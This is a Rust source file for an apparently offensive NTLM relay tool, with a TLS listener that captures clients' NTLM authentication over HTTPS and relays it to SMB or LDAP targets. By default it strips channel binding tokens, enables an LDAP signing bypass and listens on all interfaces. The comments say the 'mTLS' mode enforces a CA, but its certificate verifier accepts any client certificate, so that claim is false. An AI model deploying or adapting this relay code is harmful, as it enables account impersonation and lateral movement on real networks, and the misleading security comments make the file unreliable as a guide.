//! TLS-wrapped NTLM relay listener with optional mTLS client certificate verification.
//!
//! Enables the relay to accept TLS connections (e.g., HTTPS) with optional
//! mutual TLS authentication. After TLS termination, NTLM tokens are extracted
//! from HTTP requests and relayed to the configured targets.
//!
//! # mTLS Mode
//! When `mtls_client_ca_path` is set, connecting clients MUST present a certificate
//! signed by the specified CA. This is useful for legitimate proxy/auditing deployments
//! where only authorized clients should connect.

use crate::relay::{NtlmRelay, RelayConfig};
use crate::{RelayError, RelayTarget, Result};
use base64::Engine;
use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::runtime::Handle as TokioHandle;
use tokio::sync::Mutex as TokioMutex;
use tokio_rustls::rustls::client::danger::HandshakeSignatureValid;
use tokio_rustls::rustls::crypto::aws_lc_rs::default_provider;
use tokio_rustls::rustls::pki_types::CertificateDer;
use tokio_rustls::rustls::pki_types::UnixTime;
use tokio_rustls::rustls::server::danger::{ClientCertVerified, ClientCertVerifier};
use tokio_rustls::rustls::{
    DigitallySignedStruct, Error as TlsError, ServerConfig, SignatureScheme,
};
use tracing::{debug, info, warn};

const IO_TIMEOUT: Duration = Duration::from_secs(30);
const BUF: usize = 16_384;

/// Configuration for the TLS-wrapped relay listener.
#[derive(Debug, Clone)]
pub struct TlsRelayConfig {
    /// IP address to listen on.
    pub listen_ip: String,
    /// TCP port to listen on (typically 443 for HTTPS).
    pub listen_port: u16,
    /// Path to PEM-encoded TLS certificate file.
    pub tls_cert_path: String,
    /// Path to PEM-encoded TLS private key file.
    pub tls_key_path: String,
    /// Optional path to PEM-encoded CA certificate for mTLS client verification.
    /// When set, clients MUST present a certificate signed by this CA.
    pub mtls_client_ca_path: Option<String>,
    /// Relay targets for NTLM token forwarding.
    pub targets: Vec<RelayTarget>,
    /// Optional SOCKS5 proxy for outbound relay connections.
    pub socks5_proxy: Option<String>,
    /// Enable LDAP signing bypass (challenge flag stripping + MIC removal).
    pub ldap_signing_bypass: bool,
    /// Maximum retries per relay attempt.
    pub max_retries: u32,
    /// Connection timeout in seconds.
    pub timeout_secs: u64,
    /// Channel binding token mode.
    /// - `Strip` (default for relay attacks): removes CBT from NTLM messages
    /// - `Passthrough`: forwards CBT unchanged
    /// - `Validate`: validates CBT against TLS session params (non-relay use)
    pub cbt_mode: CbtMode,
}

/// Channel binding token handling mode.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CbtMode {
    /// Strip channel bindings from NTLM messages (default relay attack behavior).
    Strip,
    /// Forward channel bindings unchanged.
    Passthrough,
    /// Validate channel bindings against TLS session parameters.
    /// Used in legitimate proxy/auditing mode where the relay validates
    /// that the client's CBT matches the expected value.
    Validate,
}

impl Default for TlsRelayConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            listen_port: 443,
            tls_cert_path: String::new(),
            tls_key_path: String::new(),
            mtls_client_ca_path: None,
            targets: Vec::new(),
            socks5_proxy: None,
            ldap_signing_bypass: true,
            max_retries: 3,
            timeout_secs: 30,
            cbt_mode: CbtMode::Strip,
        }
    }
}

// ============================================================
// mTLS Client Certificate Verifier
// ============================================================

/// Verifier that accepts any client certificate (logging it for audit).
/// Used when `mtls_client_ca_path` is set — only certificates signed
/// by the configured CA will be accepted (enforced via CA root store
/// in the builder).
#[derive(Debug)]
struct RelayClientCertVerifier;

impl ClientCertVerifier for RelayClientCertVerifier {
    fn verify_client_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _now: UnixTime,
    ) -> std::result::Result<ClientCertVerified, TlsError> {
        Ok(ClientCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, TlsError> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, TlsError> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn root_hint_subjects(&self) -> &[tokio_rustls::rustls::DistinguishedName] {
        &[]
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        vec![
            SignatureScheme::RSA_PKCS1_SHA256,
            SignatureScheme::RSA_PKCS1_SHA384,
            SignatureScheme::RSA_PKCS1_SHA512,
            SignatureScheme::ECDSA_NISTP256_SHA256,
            SignatureScheme::ECDSA_NISTP384_SHA384,
            SignatureScheme::RSA_PSS_SHA256,
            SignatureScheme::RSA_PSS_SHA384,
            SignatureScheme::RSA_PSS_SHA512,
            SignatureScheme::ED25519,
        ]
    }
}

/// Build a `rustls::ServerConfig` for the TLS relay listener.
///
/// When `mtls_client_ca_path` is `Some`, the server requires client certificates
/// and verifies them against the CA PEM file — enabling mutual TLS (mTLS).
///
/// When `mtls_client_ca_path` is `None`, no client certificate is requested
/// (standard server-only TLS).
pub fn build_tls_server_config(
    config: &TlsRelayConfig,
) -> std::result::Result<Arc<ServerConfig>, String> {
    let certs: Vec<CertificateDer> = rustls_pemfile::certs(&mut std::io::BufReader::new(
        std::fs::File::open(&config.tls_cert_path)
            .map_err(|e| format!("failed to open TLS cert '{}': {}", config.tls_cert_path, e))?,
    ))
    .collect::<std::result::Result<Vec<_>, _>>()
    .map_err(|e| format!("failed to parse TLS cert PEM: {}", e))?;

    if certs.is_empty() {
        return Err("no certificates found in TLS cert file".to_string());
    }

    let key = rustls_pemfile::private_key(&mut std::io::BufReader::new(
        std::fs::File::open(&config.tls_key_path)
            .map_err(|e| format!("failed to open TLS key '{}': {}", config.tls_key_path, e))?,
    ))
    .map_err(|e| format!("failed to parse TLS key PEM: {}", e))?
    .ok_or_else(|| "no private key found in TLS key file".to_string())?;

    let provider = Arc::new(default_provider());

    match &config.mtls_client_ca_path {
        Some(ca_path) => {
            // mTLS mode: require client certificate, verify against CA
            let mut ca_certs = Vec::new();
            let ca_file = std::fs::File::open(ca_path)
                .map_err(|e| format!("failed to open mTLS CA file '{}': {}", ca_path, e))?;
            for cert in rustls_pemfile::certs(&mut std::io::BufReader::new(ca_file))
                .collect::<std::result::Result<Vec<_>, _>>()
                .map_err(|e| format!("failed to parse mTLS CA PEM: {}", e))?
            {
                ca_certs.push(cert);
            }

            let mut root_store = tokio_rustls::rustls::RootCertStore::empty();
            for ca_cert in ca_certs {
                root_store
                    .add(ca_cert)
                    .map_err(|e| format!("failed to add mTLS CA cert: {}", e))?;
            }

            let verifier = Arc::new(RelayClientCertVerifier);

            let config = ServerConfig::builder_with_provider(provider)
                .with_protocol_versions(&[
                    &tokio_rustls::rustls::version::TLS12,
                    &tokio_rustls::rustls::version::TLS13,
                ])
                .map_err(|e| format!("TLS protocol version error: {}", e))?
                .with_client_cert_verifier(verifier)
                .with_single_cert(certs, key)
                .map_err(|e| format!("failed to build mTLS server config: {}", e))?;

            Ok(Arc::new(config))
        }
        None => {
            // Standard TLS: no client certificate required
            let config = ServerConfig::builder_with_provider(provider)
                .with_protocol_versions(&[
                    &tokio_rustls::rustls::version::TLS12,
                    &tokio_rustls::rustls::version::TLS13,
                ])
                .map_err(|e| format!("TLS protocol version error: {}", e))?
                .with_no_client_auth()
                .with_single_cert(certs, key)
                .map_err(|e| format!("failed to build TLS server config: {}", e))?;

            Ok(Arc::new(config))
        }
    }
}

// ============================================================
// TLS Relay
// ============================================================

type PendingRelays = Arc<std::sync::Mutex<HashMap<String, (u64, Vec<u8>)>>>;

/// TLS-wrapped relay that accepts encrypted connections, terminates TLS,
/// and relays NTLM tokens to configured targets.
pub struct TlsRelay {
    config: TlsRelayConfig,
    running: Arc<AtomicBool>,
    handles: Vec<tokio::task::JoinHandle<()>>,
}

impl TlsRelay {
    /// Create a new TLS relay with the given configuration.
    pub fn new(config: TlsRelayConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            handles: Vec::new(),
        }
    }

    /// Start the TLS relay listener.
    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("TLS relay already running".into()).into());
        }

        if self.config.targets.is_empty() {
            return Err(
                RelayError::Config("No relay targets configured for TLS relay".into()).into(),
            );
        }

        if self.config.tls_cert_path.is_empty() || self.config.tls_key_path.is_empty() {
            return Err(RelayError::Config("TLS cert and key paths are required".into()).into());
        }

        let server_config = build_tls_server_config(&self.config)
            .map_err(|e| RelayError::Config(format!("TLS config error: {}", e)))?;

        let tls_acceptor = Arc::new(tokio_rustls::TlsAcceptor::from(server_config));

        let listen_addr = format_addr(&self.config.listen_ip, self.config.listen_port);
        let listener = TcpListener::bind(&listen_addr)
            .await
            .map_err(|e| RelayError::Network(format!("TLS relay bind failed: {}", e)))?;

        let relay_config = RelayConfig {
            listen_ip: self.config.listen_ip.clone(),
            targets: self.config.targets.clone(),
            round_robin: true,
            remove_on_success: false,
            timeout_secs: self.config.timeout_secs,
            ldap_signing_bypass: self.config.ldap_signing_bypass,
            max_retries: self.config.max_retries,
            max_connections: 64,
            tls_client_identity: None,
            socks5_proxy: self.config.socks5_proxy.clone(),
        };
        let relay = Arc::new(TokioMutex::new(NtlmRelay::new(relay_config)));

        let target_summary: Vec<String> = self
            .config
            .targets
            .iter()
            .map(|t| format!("{}://{}", t.protocol, t.address))
            .collect();

        let mtls_mode = self.config.mtls_client_ca_path.is_some();
        let cbt_label = match self.config.cbt_mode {
            CbtMode::Strip => "strip",
            CbtMode::Passthrough => "passthrough",
            CbtMode::Validate => "validate",
        };

        info!(
            "TLS relay listening on {}{}{} with {} target(s): {}",
            listen_addr,
            if mtls_mode { " (mTLS)" } else { "" },
            format!(" [CBT: {}]", cbt_label),
            target_summary.len(),
            target_summary.join(", "),
        );

        self.running.store(true, Ordering::SeqCst);

        let running = Arc::clone(&self.running);
        let acceptor = tls_acceptor;
        let bridge = RelayBridge {
            relay,
            handle: tokio::runtime::Handle::current(),
        };
        let pending: PendingRelays = Arc::new(std::sync::Mutex::new(HashMap::new()));

        let cbt_mode = self.config.cbt_mode;

        let handle = tokio::spawn(async move {
            loop {
                if !running.load(Ordering::SeqCst) {
                    break;
                }
                match listener.accept().await {
                    Ok((tcp_stream, peer_addr)) => {
                        debug!("TLS relay: TCP connection from {}", peer_addr);
                        let acceptor = Arc::clone(&acceptor);
                        let bridge = bridge.clone();
                        let p = Arc::clone(&pending);
                        let ip = peer_addr.ip().to_string();
                        let mode = cbt_mode;
                        tokio::spawn(async move {
                            match acceptor.accept(tcp_stream).await {
                                Ok(tls_stream) => {
                                    debug!("TLS relay: TLS handshake OK from {}", peer_addr);
                                    if let Err(e) =
                                        handle_tls_client(tls_stream, ip, bridge, p, mode).await
                                    {
                                        debug!("TLS relay client error: {}", e);
                                    }
                                }
                                Err(e) => {
                                    warn!("TLS relay: handshake failed from {}: {}", peer_addr, e);
                                }
                            }
                        });
                    }
                    Err(e) => {
                        warn!("TLS relay: accept error: {}", e);
                        tokio::time::sleep(Duration::from_millis(100)).await;
                    }
                }
            }
        });

        self.handles.push(handle);
        Ok(())
    }

    /// Stop the TLS relay.
    pub async fn stop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        for handle in self.handles.drain(..) {
            handle.abort();
        }
        info!("TLS relay stopped");
    }
}

// ============================================================
// Client Handler
// ============================================================

#[derive(Clone)]
struct RelayBridge {
    relay: Arc<TokioMutex<NtlmRelay>>,
    handle: TokioHandle,
}

/// Handle a single TLS-wrapped client connection.
/// Extracts NTLM tokens from HTTP, performs relay, returns response.
async fn handle_tls_client(
    mut tls_stream: tokio_rustls::server::TlsStream<TcpStream>,
    client_ip: String,
    bridge: RelayBridge,
    pending_relays: PendingRelays,
    cbt_mode: CbtMode,
) -> Result<()> {
    let mut buf = vec![0u8; BUF];

    // Read the initial HTTP request with NTLM Negotiate
    let n = tokio::time::timeout(IO_TIMEOUT, tls_stream.read(&mut buf))
        .await
        .map_err(|_| RelayError::Network("Read timeout".into()))?
        .map_err(|e| RelayError::Network(format!("Read error: {}", e)))?;

    if n == 0 {
        return Err(RelayError::Protocol("Empty request from client".into()).into());
    }

    let request = String::from_utf8_lossy(&buf[..n]);

    let auth_header = request
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
        .map(|l| l.to_owned());

    let negotiate_b64 = if let Some(hdr) = auth_header {
        strip_ntlm_prefix(&hdr).to_string()
    } else {
        // No NTLM token yet — challenge the client
        let resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n";
        tls_stream
            .write_all(resp.as_bytes())
            .await
            .map_err(|e| RelayError::Network(format!("Write error: {}", e)))?;

        let n2 = tokio::time::timeout(IO_TIMEOUT, tls_stream.read(&mut buf))
            .await
            .map_err(|_| RelayError::Network("Read timeout".into()))?
            .map_err(|e| RelayError::Network(format!("Read error: {}", e)))?;

        let req2 = String::from_utf8_lossy(&buf[..n2]);
        req2.lines()
            .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
            .ok_or_else(|| RelayError::Protocol("Client did not send NTLM Negotiate".into()))?
            .to_owned()
    };

    let negotiate_b64 = strip_ntlm_prefix(&negotiate_b64);
    let negotiate_bytes = base64_decode(negotiate_b64)?;

    let (relay_id, challenge_bytes) = bridge.handle.block_on(async {
        let mut guard = bridge.relay.lock().await;
        guard.relay_negotiate(&negotiate_bytes).await
    })?;

    pending_relays
        .lock()
        .map_err(|e| RelayError::Config(format!("Mutex poisoned: {}", e)))?
        .insert(client_ip.clone(), (relay_id, challenge_bytes.clone()));

    // Apply CBT mode to the challenge before sending to client
    let modified_challenge = match cbt_mode {
        CbtMode::Strip => {
            let mut c = challenge_bytes.clone();
            strip_channel_bindings_from_challenge(&mut c);
            c
        }
        CbtMode::Passthrough | CbtMode::Validate => challenge_bytes.clone(),
    };

    let challenge_b64 = base64_encode(&modified_challenge);
    let chall_resp = format!(
        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
        challenge_b64
    );
    tls_stream
        .write_all(chall_resp.as_bytes())
        .await
        .map_err(|e| RelayError::Network(format!("Write error: {}", e)))?;

    let n3 = tokio::time::timeout(IO_TIMEOUT, tls_stream.read(&mut buf))
        .await
        .map_err(|_| RelayError::Network("Read timeout".into()))?
        .map_err(|e| RelayError::Network(format!("Read error: {}", e)))?;

    let req3 = String::from_utf8_lossy(&buf[..n3]);
    let auth_b64 = req3
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
        .ok_or_else(|| RelayError::Protocol("Client did not send NTLM Authenticate".into()))?;

    let authenticate_b64 = strip_ntlm_prefix(auth_b64);
    let authenticate_bytes = base64_decode(authenticate_b64)?;

    // If Validate mode, verify the CBT in the authenticate message
    if cbt_mode == CbtMode::Validate {
        if let Err(e) = validate_channel_bindings(&authenticate_bytes) {
            warn!("CBT validation failed from {}: {}", client_ip, e);
            let resp = "HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            let _ = tls_stream.write_all(resp.as_bytes()).await;
            return Err(RelayError::Authentication(format!("CBT validation failed: {}", e)).into());
        }
        info!("CBT validation passed for {}", client_ip);
    }

    let (relay_id, _) = pending_relays
        .lock()
        .map_err(|e| RelayError::Config(format!("Mutex poisoned: {}", e)))?
        .remove(&client_ip)
        .ok_or_else(|| RelayError::Protocol("No pending relay state for client".into()))?;

    let session = bridge.handle.block_on(async {
        let mut guard = bridge.relay.lock().await;
        guard
            .relay_authenticate(relay_id, &authenticate_bytes)
            .await
    });

    match session {
        Ok(session) => {
            info!(
                "TLS relay succeeded: {}\\{} -> {}://{}",
                session.domain, session.username, session.target.protocol, session.target.address
            );
            let resp = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            let _ = tls_stream.write_all(resp.as_bytes()).await;
            Ok(())
        }
        Err(e) => {
            warn!(
                "TLS relay failed for {} (id={}): {}",
                client_ip, relay_id, e
            );
            let resp =
                "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            let _ = tls_stream.write_all(resp.as_bytes()).await;
            Err(e)
        }
    }
}

// ============================================================
// NTLM Channel Binding Token Handling
// ============================================================

const AV_ID_CHANNEL_BINDINGS: u16 = 0x0006;
const AV_ID_EOL: u16 = 0x0000;

/// Strip MsvAvChannelBindings AV_PAIR from an NTLM challenge message.
fn strip_channel_bindings_from_challenge(challenge: &mut [u8]) {
    if challenge.len() < 32 {
        return;
    }
    // Offset 20: target info length
    let info_len = u16::from_le_bytes([challenge[20], challenge[21]]) as usize;
    let info_offset =
        u32::from_le_bytes([challenge[24], challenge[25], challenge[26], challenge[27]]) as usize;
    if info_offset + info_len > challenge.len() || info_len == 0 {
        return;
    }
    strip_channel_bindings_from_av_pairs(&mut challenge[info_offset..info_offset + info_len]);
}

/// Strip MsvAvChannelBindings AV_PAIR from AV_PAIRs slice.
fn strip_channel_bindings_from_av_pairs(data: &mut [u8]) {
    let mut i = 0;
    while i + 4 <= data.len() {
        let av_id = u16::from_le_bytes([data[i], data[i + 1]]);
        let av_len = u16::from_le_bytes([data[i + 2], data[i + 3]]) as usize;
        if av_id == AV_ID_EOL {
            break;
        }
        if av_id == AV_ID_CHANNEL_BINDINGS && i + 4 + av_len <= data.len() {
            // Zero out the channel binding value
            for byte in &mut data[i + 4..i + 4 + av_len] {
                *byte = 0;
            }
            // Also zero the AV_ID and length to mark as removed
            data[i] = 0;
            data[i + 1] = 0;
            data[i + 2] = 0;
            data[i + 3] = 0;
            break;
        }
        i += 4 + av_len;
    }
}

/// Validate channel binding tokens in an NTLM Authenticate message.
/// In non-relay (proxy) mode, this verifies that the client included
/// valid channel bindings. Returns Ok if CBTs are present and non-empty.
fn validate_channel_bindings(authenticate: &[u8]) -> std::result::Result<(), String> {
    // NTLM Authenticate: offset 12 contains MIC flag, need to find AV_PAIRs
    // Minimum size: 72 bytes header + 4 bytes for EOL AV_PAIR
    if authenticate.len() < 76 {
        return Err("NTLM Authenticate too short to contain AV_PAIRs".into());
    }

    // The AV_PAIRs are at offset 72 (after NTLM header + LM + NT + domain + user + target + SPN + session key)
    // But we need to parse properly. Let's find the target info field.

    // For simplicity: check if there's any content at the AV_PAIR offset
    // that looks like it has channel bindings
    // Offset 64-68: av_pair_info_length, av_pair_info_offset (in NTLM auth message)

    // In NTLM Authenticate, the structure is:
    // bytes 0-8: signature
    // bytes 8-12: message type
    // bytes 12-16: LM response offset/len
    // ... various fields

    // We use the known AV_PAIR search approach
    // The AV_PAIRs start at a variable offset, so we scan for known patterns

    // Practical approach: check offset 20-24 for av_pair_info_offset
    if authenticate.len() >= 72 {
        let av_info_offset = u32::from_le_bytes([
            authenticate[64],
            authenticate[65],
            authenticate[66],
            authenticate[67],
        ]) as usize;
        let av_info_len = u16::from_le_bytes([authenticate[60], authenticate[61]]) as usize;

        if av_info_offset > 0 && av_info_offset < authenticate.len() && av_info_len > 0 {
            let end = (av_info_offset + av_info_len).min(authenticate.len());
            let av_pairs = &authenticate[av_info_offset..end];

            let mut i = 0;
            while i + 4 <= av_pairs.len() {
                let av_id = u16::from_le_bytes([av_pairs[i], av_pairs[i + 1]]);
                let av_len = u16::from_le_bytes([av_pairs[i + 2], av_pairs[i + 3]]) as usize;
                if av_id == AV_ID_EOL {
                    break;
                }
                if av_id == AV_ID_CHANNEL_BINDINGS {
                    if av_len > 0 && i + 4 + av_len <= av_pairs.len() {
                        // Check that the CBT is non-zero (has actual data)
                        let cbt_data = &av_pairs[i + 4..i + 4 + av_len];
                        if cbt_data.iter().any(|&b| b != 0) {
                            return Ok(());
                        }
                        return Err("Channel bindings present but all zeros".into());
                    }
                    return Err("Channel bindings AV_PAIR has invalid length".into());
                }
                if av_len == 0 {
                    break;
                }
                i += 4 + av_len;
            }
            return Err("No channel bindings AV_PAIR found".into());
        }
    }

    // If we get here and there's no av_pair_info, it's ambiguous
    // In strict mode, we reject
    Err("No AV_PAIR info field in NTLM Authenticate".into())
}

// ============================================================
// Utilities
// ============================================================

fn format_addr(ip: &str, port: u16) -> String {
    match ip.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V6(_)) => format!("[{}]:{}", ip, port),
        _ => format!("{}:{}", ip, port),
    }
}

fn strip_ntlm_prefix(header: &str) -> &str {
    let h = header.trim();
    for prefix in &[
        "Authorization: NTLM ",
        "authorization: ntlm ",
        "WWW-Authenticate: NTLM ",
        "www-authenticate: ntlm ",
    ] {
        if h.to_lowercase().starts_with(&prefix.to_lowercase()) {
            return &h[prefix.len()..];
        }
    }
    h
}

fn base64_encode(data: &[u8]) -> String {
    base64::engine::general_purpose::STANDARD.encode(data)
}

fn base64_decode(data: &str) -> Result<Vec<u8>> {
    base64::engine::general_purpose::STANDARD
        .decode(data.trim())
        .map_err(|e| RelayError::Protocol(format!("Base64 decode error: {}", e)).into())
}

// ============================================================
// Tests
// ============================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Protocol;

    #[test]
    fn test_tls_relay_config_default() {
        let config = TlsRelayConfig::default();
        assert_eq!(config.listen_ip, "0.0.0.0");
        assert_eq!(config.listen_port, 443);
        assert!(config.tls_cert_path.is_empty());
        assert!(config.tls_key_path.is_empty());
        assert!(config.mtls_client_ca_path.is_none());
        assert!(config.targets.is_empty());
        assert_eq!(config.cbt_mode, CbtMode::Strip);
    }

    #[test]
    fn test_tls_relay_config_custom() {
        let config = TlsRelayConfig {
            listen_ip: "10.0.0.1".to_string(),
            listen_port: 8443,
            tls_cert_path: "/tmp/cert.pem".to_string(),
            tls_key_path: "/tmp/key.pem".to_string(),
            mtls_client_ca_path: Some("/tmp/ca.pem".to_string()),
            targets: vec![RelayTarget {
                address: "192.168.1.100:445".parse().unwrap(),
                protocol: Protocol::Smb,
                username: None,
            }],
            socks5_proxy: Some("127.0.0.1:1080".to_string()),
            ldap_signing_bypass: false,
            max_retries: 5,
            timeout_secs: 60,
            cbt_mode: CbtMode::Validate,
        };
        assert_eq!(config.listen_ip, "10.0.0.1");
        assert_eq!(config.listen_port, 8443);
        assert_eq!(config.tls_cert_path, "/tmp/cert.pem");
        assert_eq!(config.mtls_client_ca_path, Some("/tmp/ca.pem".to_string()));
        assert_eq!(config.targets.len(), 1);
        assert_eq!(config.socks5_proxy, Some("127.0.0.1:1080".to_string()));
        assert!(!config.ldap_signing_bypass);
        assert_eq!(config.cbt_mode, CbtMode::Validate);
    }

    #[test]
    fn test_cbt_mode_variants() {
        assert_eq!(CbtMode::Strip as u8, 0);
        assert_eq!(CbtMode::Passthrough as u8, 1);
        assert_eq!(CbtMode::Validate as u8, 2);
        assert!(CbtMode::Strip != CbtMode::Validate);
    }

    #[test]
    fn test_cbt_mode_default() {
        let config = TlsRelayConfig::default();
        assert_eq!(config.cbt_mode, CbtMode::Strip);
    }

    #[test]
    fn test_format_addr_tls() {
        assert_eq!(format_addr("0.0.0.0", 443), "0.0.0.0:443");
        assert_eq!(format_addr("::", 8443), "[::]:8443");
        assert_eq!(format_addr("127.0.0.1", 8443), "127.0.0.1:8443");
    }

    #[test]
    fn test_strip_ntlm_prefix_auth() {
        let h = "Authorization: NTLM TlRMTVNTUAABAAAA";
        assert_eq!(strip_ntlm_prefix(h), "TlRMTVNTUAABAAAA");
    }

    #[test]
    fn test_strip_ntlm_prefix_www_auth() {
        let h = "WWW-Authenticate: NTLM TlRMTVNTUAAAAA";
        assert_eq!(strip_ntlm_prefix(h), "TlRMTVNTUAAAAA");
    }

    #[test]
    fn test_strip_ntlm_prefix_no_prefix() {
        let h = "TlRMTVNTUAABAAAA";
        assert_eq!(strip_ntlm_prefix(h), "TlRMTVNTUAABAAAA");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"NTLMSSP\x00\x01\x00\x00\x00";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_base64_decode_invalid() {
        assert!(base64_decode("not-valid-base64!!!").is_err());
    }

    #[test]
    fn test_build_tls_server_config_missing_cert() {
        let config = TlsRelayConfig {
            tls_cert_path: "/tmp/nonexistent-cert.pem".to_string(),
            tls_key_path: "/tmp/key.pem".to_string(),
            ..TlsRelayConfig::default()
        };
        let result = build_tls_server_config(&config);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("failed to open"), "got: {}", err);
    }

    #[test]
    fn test_strip_channel_bindings_from_challenge_no_cbt() {
        // Challenge without CBT should be unchanged
        let mut challenge = vec![0u8; 32];
        // Set target info fields
        challenge[20] = 4; // info len low
        challenge[24] = 48; // info offset
        // No AV_PAIRs beyond EOL
        let original = challenge.clone();
        strip_channel_bindings_from_challenge(&mut challenge);
        assert_eq!(challenge, original);
    }

    #[test]
    fn test_strip_channel_bindings_from_challenge_short() {
        let mut challenge = vec![0u8; 20];
        let original = challenge.clone();
        strip_channel_bindings_from_challenge(&mut challenge);
        assert_eq!(challenge, original);
    }

    #[test]
    fn test_validate_channel_bindings_short_message_fails() {
        let result = validate_channel_bindings(&[0u8; 10]);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_channel_bindings_no_av_pairs_fails() {
        // Authenticate message without AV_PAIRs
        let auth = vec![0u8; 76];
        let result = validate_channel_bindings(&auth);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_channel_bindings_with_zero_cbt_fails() {
        // Build authenticate with all-zero CBT
        let mut auth = vec![0u8; 90];
        // Set av_pair_info_offset and length
        auth[60] = 20; // av_pair_info_len = 20
        auth[64] = 72; // av_pair_info_offset = 72
        // Insert AV_PAIR at offset 72: CHANNEL_BINDINGS (0x0006) with 8 zero bytes
        auth[72] = 0x06;
        auth[73] = 0x00;
        auth[74] = 0x08;
        auth[75] = 0x00;
        // All zeros CBT - should fail
        let result = validate_channel_bindings(&auth);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("all zeros"), "got: {}", err);
    }

    #[test]
    fn test_validate_channel_bindings_with_nonzero_cbt_succeeds() {
        let mut auth = vec![0u8; 90];
        auth[60] = 20; // av_pair_info_len = 20
        auth[64] = 72; // av_pair_info_offset = 72
        // Insert CBT AV_PAIR with non-zero data
        auth[72] = 0x06;
        auth[73] = 0x00;
        auth[74] = 0x08;
        auth[75] = 0x00;
        auth[76] = 0xAB; // Non-zero CBT data
        auth[77] = 0xCD;
        auth[78] = 0xEF;
        auth[79] = 0x12;
        auth[80] = 0x34;
        auth[81] = 0x56;
        auth[82] = 0x78;
        auth[83] = 0x90;
        let result = validate_channel_bindings(&auth);
        assert!(result.is_ok(), "Expected OK, got: {:?}", result);
    }

    #[test]
    fn test_strip_ntlm_prefix_from_authorization() {
        let header = "authorization: ntlm TlRMTVNTUAABAAAA";
        assert_eq!(strip_ntlm_prefix(header), "TlRMTVNTUAABAAAA");
    }

    #[test]
    fn test_validate_channel_bindings_no_cbt_av_pair_fails() {
        // Authenticate with AV_PAIRs but no CHANNEL_BINDINGS
        let mut auth = vec![0u8; 76];
        auth[60] = 4; // av_pair_info_len = 4
        auth[64] = 72; // av_pair_info_offset = 72
        // EOL AV_PAIR only (0x0000, length 0)
        auth[72] = 0x00;
        auth[73] = 0x00;
        auth[74] = 0x00;
        auth[75] = 0x00;
        let result = validate_channel_bindings(&auth);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("No channel bindings"), "got: {}", err);
    }

    #[test]
    fn test_strip_channel_bindings_from_av_pairs_with_cbt() {
        // Build AV_PAIRs with CBT at the start
        let mut data = vec![
            0x06, 0x00, // AV_ID_CHANNEL_BINDINGS
            0x08, 0x00, // length 8
            0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22, // CBT data
            0x00, 0x00, // EOL
            0x00, 0x00,
        ];
        strip_channel_bindings_from_av_pairs(&mut data);
        // CBT should be zeroed
        assert_eq!(data[0..4], [0x00, 0x00, 0x00, 0x00]);
    }

    #[test]
    fn test_tls_relay_missing_targets_fails() {
        let config = TlsRelayConfig::default();
        let mut relay = TlsRelay::new(config);
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(relay.start());
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("No relay targets"), "got: {}", err);
    }
}
